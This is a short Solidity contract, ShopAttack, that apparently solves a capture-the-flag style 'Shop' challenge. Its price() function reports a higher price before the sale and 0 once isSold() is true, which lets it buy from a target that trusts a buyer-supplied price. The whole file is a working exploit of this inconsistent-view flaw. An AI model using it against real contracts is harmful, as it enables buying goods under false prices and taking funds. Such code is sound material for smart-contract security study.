// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint);

    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopAttack {
    function buy(IShop _shop) external {
        _shop.buy();
    }

    function price() external view returns (uint256) {
        IShop _shop = IShop(msg.sender);

        if (_shop.isSold()) {
            return 0;
        }

        return _shop.price() + 1;
    }
}
